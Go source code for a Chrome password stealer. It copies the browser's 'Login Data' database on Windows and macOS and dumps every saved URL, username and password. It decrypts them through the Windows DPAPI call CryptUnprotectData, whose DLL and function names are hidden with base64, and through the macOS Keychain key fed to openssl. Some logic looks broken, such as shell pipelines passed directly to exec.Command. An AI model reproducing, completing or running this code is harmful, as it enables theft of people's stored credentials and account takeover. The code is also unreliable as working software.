package main

import (
	"crypto/sha1"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/pbkdf2"
)

const iv = "20202020202020202020202020202020"
const CRYPTPROTECT_UI_FORBIDDEN = 0x1

func Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func Decode(str string) string {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return ""
	}
	return string(data)
}
func EncodeRaw(str []byte) string {
	return base64.StdEncoding.EncodeToString(str)
}

func DecodeRaw(str string) []byte {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return nil
	}
	return data
}

var (
	dllcrypt32      = syscall.NewLazyDLL(Decode("Q3J5cHQzMi5kbGw="))         //Crypt32.dll
	dllkernel32     = syscall.NewLazyDLL(Decode("a2VybmVsMzIuZGxs"))         //kernel32.dll
	procDecryptData = dllcrypt32.NewProc(Decode("Q3J5cHRVbnByb3RlY3REYXRh")) //CryptUnprotectData
	procLocalFree   = dllkernel32.NewProc(Decode("TG9jYWxGcmVl"))            //LocalFree
)

func Base64Encode(content string) string {
	data := []byte(content)
	return base64.StdEncoding.EncodeToString(data)
}

func CopyFile(src string, dst string) {
	source, _ := os.Open(src)
	defer source.Close()
	destination, _ := os.Create(dst)
	defer destination.Close()
	_, _ = io.Copy(destination, source)
}

func MacDecrypt(key string, enc string) string {
	if len(enc) < 3 {
		return ""
	}
	enc = Base64Encode(enc[3:])
	src := pbkdf2.Key([]byte(key), []byte("saltysalt"), 1003, 32, sha1.New)[0:16]
	dst := make([]byte, hex.EncodedLen(len(src)))
	hex.Encode(dst, src)
	output := RunCommand(
		fmt.Sprintf("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null", iv, dst, enc))
	return output
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func WindowsDecrypt(data []byte) ([]byte, error) {
	/* dllcrypt32  := syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 := syscall.NewLazyDLL("Kernel32.dll")
	procDecryptData := dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   := dllkernel32.NewProc("LocalFree")
	var outblob DATA_BLOB
	r, _, _ := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray() */
	//return []byte{}

	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, CRYPTPROTECT_UI_FORBIDDEN, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func SystemType() string {
	return runtime.GOOS
}

func ChromePassword() []ChromePasswordStruct {
	switch SystemType() {
	case "darwin":
		return getMacChromePassword()
	case "windows":
		return getWindowsChromePassword()
	default:

		return []ChromePasswordStruct{}
	}
}

func IsFileExist(path string) bool {
	info, err := os.Stat(path)

	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}

type ChromePasswordStruct struct {
	Url      string
	UserName string
	Password string
}

func RunCommand(command string) string {
	cmd := exec.Command(command)
	output, err := cmd.Output()
	if err != nil {
		fmt.Printf("[+] Command failed with %s\n", err.Error())
		return ""
	}
	return string(output)
}

func copyDBAndGetRows(route string, dst string) *sql.Rows {
	if !IsFileExist(route) {
		return nil
	}
	CopyFile(route, dst)
	db, _ := sql.Open("sqlite3", dst)
	defer db.Close()
	rows, _ := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	return rows
}

func getMacChromePassword() []ChromePasswordStruct {
	route := os.Getenv("HOME") + "/Library/Application Support/Google/Chrome/Default/Login Data"
	macStorageKey := RunCommand("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' " +
		"| awk '{print $2}'")
	macStorageKey = strings.Replace(macStorageKey, `"`, "", -1)
	rows := copyDBAndGetRows(route, os.Getenv("HOME")+"/tempfile.dat")
	if rows == nil {
		return []ChromePasswordStruct{}
	}
	defer rows.Close()
	var result []ChromePasswordStruct
	for rows.Next() {
		var url string
		var username string
		var password string
		_ = rows.Scan(&url, &username, &password)
		decryptedPassword := MacDecrypt(macStorageKey, password)
		if decryptedPassword == "" {
			continue
		}
		result = append(result, ChromePasswordStruct{
			Url:      url,
			UserName: username,
			Password: string(decryptedPassword),
		})
	}
	return result
}

func getWindowsChromePassword() []ChromePasswordStruct {
	route := os.Getenv("localappdata") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
	rows := copyDBAndGetRows(route, os.Getenv("APPDATA")+"\\tempfile.dat")
	if rows == nil {
		return []ChromePasswordStruct{}
	}
	var result []ChromePasswordStruct
	for rows.Next() {
		var url string
		var username string
		var password string
		_ = rows.Scan(&url, &username, &password)
		decryptedPassword, _ := WindowsDecrypt([]byte(password))
		result = append(result, ChromePasswordStruct{
			Url:      url,
			UserName: username,
			Password: string(decryptedPassword),
		})
	}
	return result
}

func main() {
	fmt.Println(ChromePassword())
}
